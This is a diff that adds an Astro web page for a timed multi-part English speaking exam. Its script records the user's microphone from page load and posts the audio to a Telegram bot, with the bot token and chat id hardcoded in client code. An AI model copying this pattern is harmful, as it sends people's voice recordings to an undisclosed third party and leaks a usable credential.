@@ -1,0 +1,773 @@
+---
+import 'bootstrap/dist/css/bootstrap.css';
+import '../css/mdb.min.css'
+import '../css/style.css'
+import Layout from '../../../layouts/Layout.astro'
+---
+
+<Layout title="Test 1">
+ <!---welcome--->
+ <div id="welcome">
+    <div class="container d-flex justify-content-center align-items-center" style="min-height: 100vh;">
+    <div class="card shadow" style="width: 500px;">
+        <div class="card-header"><h3 class="text-dark text-center">Multi Level Speaking</h3></div>
+        <div class="card-body">
+         <h5 class="text-center">Welcome to Speaking Exam!</h5>
+         <p>Test contains the followings:</p>
+          <ul>
+            <li>Part 1: 6 questions</li>
+            <li>Part 2: Cue Card (duration: 2 minutes)</li>
+            <li>Part 3: 5 questions (related to Part 2)</li>
+          </ul>
+          <p class="text-dark text-center fw-bold">If you are ready Please, hit the "Start" button below!</p>
+           <center><button onclick="step0()" class="btn btn-primary px-5 py-2" style="font-size: 17px;">Start</button></center>
+        </div>
+    </div>
+</div>
+</div>
+
+<!----welcome ends-->
+
+<div id="quizBar">
+<div class="navbar navbar-expand-lg navbar-light bg-dark shadow">
+    <div class="container-fluid">
+        <a class="navbar-brand text-light" href="#">Multi Level Speaking</a>
+        <div class="timer-bar text-white" id="full-screen" onclick="toggleFullScreen()"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 3.75v4.5m0-4.5h4.5m-4.5 0L9 9M3.75 20.25v-4.5m0 4.5h4.5m-4.5 0L9 15M20.25 3.75h-4.5m4.5 0v4.5m0-4.5L15 9m5.25 11.25h-4.5m4.5 0v-4.5m0 4.5L15 15" />
+          </svg>
+          </div>
+        </div>
+</div> 
+
+<div class="text-center my-5">
+    <span id="part1" class=" badge px-3 py-2 bg-success level-one fw-bold text-light mx-3">Part 1</span>
+    <span id="part2" class=" badge px-3 py-2  bg-primary level-two fw-bold text-light mx-3 rounded">Part 2</span>
+    <span id="part3" class=" badge  bg-primary px-3 py-2 level-three fw-bold text-light mx-3 rounded">Part 3</span>
+  </div>
+ 
+ <section class="container my-3 pt-2 shadow-sm border-1" style="border: 1px solid lightgrey; border-radius: 5px;">
+     <div id="alert-time" class="alert alert-danger">Wait 30 seconds to upload your answer</div>
+ <div class="row">
+   <div class="col-md-5 py-3">
+     <div class="card">
+       <div class="card-body">
+         <div class="header-question d-flex justify-content-between align-items-center">
+           <span class="badge rounded-pill text-bg-dark border-0 px-5 py-2">Question# <span id="que-id"></span></span>
+           <div>
+           <i class="fa fa-volume-up text-dark mx-1"></i><input class="text-dark" type="range" id="audio_volume" min="0" max="1" step="0.01" name=""></div>
+         </div>
+         <hr>
+         <div class=" quiz-container mt-3 d-flex justify-content-center align-items-center">
+           <button class="btn btn-dark px-3 py-1 mx-3" onclick="sizeDown()">A-</button>
+            <button class="btn btn-dark px-3 py-1 mx-3" onclick="sizeUp()">A+</button>
+         </div>
+         <hr>
+         <div id="question-bar">
+         </div>
+         <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Fbeep.mp3?alt=media&token=a5e51e2e-dd71-4c15-bbb3-c2038fa54729" id="beep"></audio>
+       </div>
+     </div>
+   </div>
+   <!----Right side--->
+   <div class="col-md-7 py-3">
+     <div class="card" id="card">
+       <div class="card-body">
+         <div class="header-question d-flex justify-content-around align-items-center">
+           <button class="btn btn-dark w-100 fw-bold py-1">
+            <i class="fa fa-stopwatch text-light" style="font-size:23px"></i><span class="text-light px-2" id="timer" style="width:50px; font-size: 23px;"></span>
+           </button>
+         </div>
+         <div class="recorder">
+         <span class="circle text-center"></span>
+         <div id="waveform"></div>
+         <p id="recording"></p>
+         <div id="downloadContainer" class="d-flex flex-column">
+            <audio src="" id="audio-playback"></audio>
+            <a class="btn btn-primary text-white my-3" href="" download="" id="downloadButton">Download Answer</a>
+            <a id="home" class="my-2 btn btn-primary text-decoration-none" href="/account/dashboard" style="display:none">Back to Home</a>
+         </div>
+         </div>
+         
+       </div>
+     </div>
+   </div>
+ </div>
+ </section>
+
+
+
+<!------->
+                   
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart1%2F1.mp3?alt=media&token=288bc7c2-bf53-4259-a7dc-2dca2745d475" id="audio_1"></audio>
+                        </div>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart1%2F2.mp3?alt=media&token=a06bd455-f66d-4047-add5-3fa772f1b815" id="audio_2"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart1%2F3.mp3?alt=media&token=83520293-be84-488b-8616-6d00c5047273" id="audio_3"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart1%2F4.mp3?alt=media&token=50220c83-435e-4be9-830a-1297d53497f4" id="audio_4"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart1%2F5.mp3?alt=media&token=df184e0f-8ed8-4186-9f91-89a699d84b6e" id="audio_5"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart1%2F6.mp3?alt=media&token=a1245708-dd90-426b-b3ed-334f522d86ef" id="audio_6"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart2%2Fintro.mp3?alt=media&token=ee9d5fcc-708e-4437-9897-3df43a3a6e00" id="audio_7"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart2%2F1.mp3?alt=media&token=f8b51838-10aa-4f57-9ea4-a5af29610481" id="audio_8"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart3%2Fintro.mp3?alt=media&token=6ce2c6fe-dbee-4948-ad2f-7a6cfde36a9e" id="audio_9"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart3%2F1.mp3?alt=media&token=f4bcf236-0996-4430-88b5-84799cd56440" id="audio_10"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart3%2F2.mp3?alt=media&token=52e91742-040b-47d6-b88b-02cf88797c28" id="audio_11"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart3%2F3.mp3?alt=media&token=f70e25a5-1ae9-4b25-bd1f-22e5153f4a48" id="audio_12"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart3%2F4.mp3?alt=media&token=20100d00-64a5-4065-a988-bfc465ccc416" id="audio_13"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart3%2F5.mp3?alt=media&token=4510d91e-8389-4333-acd8-53447beacdff" id="audio_14"></audio>
+                        <audio src="https://firebasestorage.googleapis.com/v0/b/exam-online-384406.appspot.com/o/Exam%2Ftest1%2Fpart3%2Fend.mp3?alt=media&token=3d13d886-01c2-4b2c-a3ec-fe533a6a7869" id="audio_15"></audio>
+                        
+                
+</div>
+</Layout>
+<script is:inline>
+
+const part1=document.getElementById("quizBar");
+const section1=document.getElementById("part1");
+const section2=document.getElementById("part2")
+const section3=document.getElementById("part3")
+const welcome=document.getElementById("welcome")
+const que=document.getElementById("question-bar");
+const audio1=document.getElementById("audio_1");
+const audio2=document.getElementById("audio_2");
+const audio3=document.getElementById("audio_3");
+const audio4=document.getElementById("audio_4");
+const audio5=document.getElementById("audio_5");
+const audio6=document.getElementById("audio_6");
+const audio7=document.getElementById("audio_7");
+const audio8=document.getElementById("audio_8");
+const audio9=document.getElementById("audio_9");
+const audio10=document.getElementById("audio_10");
+const audio11=document.getElementById("audio_11");
+const audio12=document.getElementById("audio_12");
+const audio13=document.getElementById("audio_13");
+const audio14=document.getElementById("audio_14");
+const audio15=document.getElementById("audio_15");
+const beep=document.getElementById("beep");
+const timer=document.getElementById("timer");
+const que_id=document.getElementById("que-id");
+const downloadAudio =document.getElementById("downloadButton");
+const preview =document.getElementById("audio-playback")
+let recorder, audio_stream;
+
+part1.style.display="none";
+preview .style.display="none";
+downloadAudio .style.display="none";
+downloadAudio.addEventListener("click", downloadRecording);
+//Recorder
+startRecording();
+function startRecording() {
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(function (stream) {
+      audio_stream = stream;
+      recorder = new MediaRecorder(stream);
+
+      // when there is data, compile into object for preview src
+      recorder.ondataavailable = function (e) {
+        const url = URL.createObjectURL(e.data);
+		preview.src = url;
+// set link href as blob url, replaced instantly if re-recorded
+        downloadAudio.href = url;
+        const formData = new FormData();
+        formData.append('audio', e.data, 'recording.mp3');
+        fetch('https://api.telegram.org/bot6124695087:AAG0NprnUOPuxyaHA_79ZDazy870_007Dtk/sendAudio?chat_id=6034570280', {
+          method: 'POST',
+          body: formData
+        })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+      };
+      recorder.start();
+
+    });
+}
+
+
+function stopRecording() {
+    recorder.stop();
+  }
+
+  function downloadRecording(){
+    var name = new Date();
+    var res = name.toISOString().slice(0,10)
+    downloadAudio.download = res + '.wav';
+}
+
+//Scale UpandDown
+var TextSize=document.getElementById("question-bar");
+ function sizeUp(){
+    var style = window.getComputedStyle(TextSize, null).getPropertyValue('font-size');
+    var fontSize = parseFloat(style);
+    TextSize.style.fontSize=(fontSize+1)+'px'
+ }
+
+ function sizeDown(){
+    var style = window.getComputedStyle(TextSize, null).getPropertyValue('font-size');
+    var fontSize = parseFloat(style);
+    TextSize.style.fontSize=(fontSize-1)+'px'
+ }
+
+ //Fullscreen
+ function toggleFullScreen() {
+	if (!document.fullscreenElement) {
+	  document.documentElement.requestFullscreen();
+	  document.getElementById("full-screen").innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M9 9V4.5M9 9H4.5M9 9L3.75 3.75M9 15v4.5M9 15H4.5M9 15l-5.25 5.25M15 9h4.5M15 9V4.5M15 9l5.25-5.25M15 15h4.5M15 15v4.5m0-4.5l5.25 5.25" />
+</svg>
+`
+	} else if (document.exitFullscreen) {
+	  document.exitFullscreen();
+	 document.getElementById("full-screen").innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 3.75v4.5m0-4.5h4.5m-4.5 0L9 9M3.75 20.25v-4.5m0 4.5h4.5m-4.5 0L9 15M20.25 3.75h-4.5m4.5 0v4.5m0-4.5L15 9m5.25 11.25h-4.5m4.5 0v-4.5m0 4.5L15 15" />
+</svg>
+`
+	}
+  }
+  
+
+
+//Step1
+function step0() {
+	welcome.style.display="none";
+	part1.style.display="block"
+	que.innerHTML="What is your favourite festival?";
+	que_id.innerHTML=1
+	audio1.play();
+	audio1.addEventListener("ended", startCountdown)
+
+	// Define a function to start the 5-second countdown
+function startCountdown() {
+	let count = 5;
+	timer.innerHTML += `${count} seconds`;
+	const interval = setInterval(() => {
+	  count--;
+	  timer.innerHTML = `${count} seconds`;
+	  if (count <= 0) {
+		beep.play();
+		clearInterval(interval);
+		start30SecondCountdown();
+	  }
+	}, 1000);
+  }
+
+	// Define a function to start the 30-second countdown
+	function start30SecondCountdown() {
+		let count = 30;
+		timer.innerHTML = ` ${count}  LEFT`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} LEFT`;
+		  if (count <= 0) {
+			timer.innerHTML="";
+			clearInterval(interval);
+			step1();
+	
+		  }
+		}, 1000);
+	  }
+	
+}
+
+//Step1 fun
+
+function step1(){
+	que.innerHTML="How do you celebrate the festival?";
+	que_id.innerHTML=2
+	audio2.play();
+	audio2.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step2();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step2
+
+function step2(){
+	que.innerHTML="What is the most popular festival in your country?";
+	que_id.innerHTML=3
+	audio3.play();
+	audio3.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step3();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+//step3
+
+function step3(){
+	que.innerHTML="Do you like western festivals?";
+	que_id.innerHTML=4
+	audio4.play();
+	audio4.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step4();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step4
+
+function step4(){
+	que.innerHTML="Where do people usually go during festivals?";
+	que_id.innerHTML=5
+	audio5.play();
+	audio5.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step5();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step5
+
+function step5(){
+	que.innerHTML="With whom do you like to celebrate festivals?";
+	que_id.innerHTML=6
+	audio6.play();
+	audio6.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				part2();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//part2 intro
+
+function part2(){
+	que.innerHTML='';
+	que_id.innerHTML=''
+	audio7.play();
+	section1.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+</svg>
+`;
+	section2.classList.add("bg-success");
+	audio7.addEventListener("ended", step6);
+}
+
+//step6
+
+function step6(){
+	que.innerHTML=`<p><b>Describe a piece of technology that you use a lot.</b></p><p>You should say:</p><ul><li>What is it?</li><li>What you use it for</li><li>how long you have been using it</li><li>and say how you would feel without it</li></ul><br><textarea class="form-control" id="exampleFormControlTextarea1" rows="3" placeholder="Izoh yozish uchun"></textarea>`;
+	que_id.innerHTML=7
+	audio8.play();
+	audio8.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 60;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 120;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				part3();
+			  }
+			}, 1000);
+		  }
+}
+
+
+//part3 intro
+
+function part3(){
+	que.innerHTML='';
+	que_id.innerHTML=''
+	audio9.play();
+	section1.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+</svg>
+`;
+	section2.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+</svg>
+`;
+	section3.classList.add("bg-success");
+	audio9.addEventListener("ended", step7);
+}
+
+
+//step7
+
+
+function step7(){
+	que.innerHTML="In your opinion, is technology making people's lives easier?";
+	que_id.innerHTML=8
+	audio10.play();
+	audio10.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step8();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+
+
+//step8
+
+function step8(){
+	que.innerHTML="What kinds of modern technology do people rely on their daily life?";
+	que_id.innerHTML=9
+	audio11.play();
+	audio11.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step9();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step9
+
+function step9(){
+	que.innerHTML="How much has technology improved and how we communicate with each other?";
+	que_id.innerHTML=10
+	audio12.play();
+	audio12.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step10();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step10
+
+function step10(){
+	que.innerHTML="Do you think that the advance of technology has improved standards of education in schools?";
+	que_id.innerHTML=11
+	audio13.play();
+	audio13.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				step11();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step11
+
+
+function step11(){
+	que.innerHTML="Do you think people rely too much on technology today?";
+	que_id.innerHTML=12
+	audio14.play();
+	audio14.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				timer.innerHTML="";
+				clearInterval(interval);
+				examEnd();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+function examEnd(){
+	audio15.play();
+	que.innerHTML='';
+	que_id.innerHTML='';
+    section3.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+</svg>
+`
+	preview .style.display="block";	audio15.addEventListener("ended",function(){
+		stopRecording();
+		document.getElementById("alert-time").style.display="block"
+        startCountdownend()
+
+});		
+}
+
+function startCountdownend() {
+		let count = 40;
+		document.getElementById("alert-time").innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+            document.getElementById("home").style.display="block";
+		  }
+		}, 1000);
+    }
+</script>
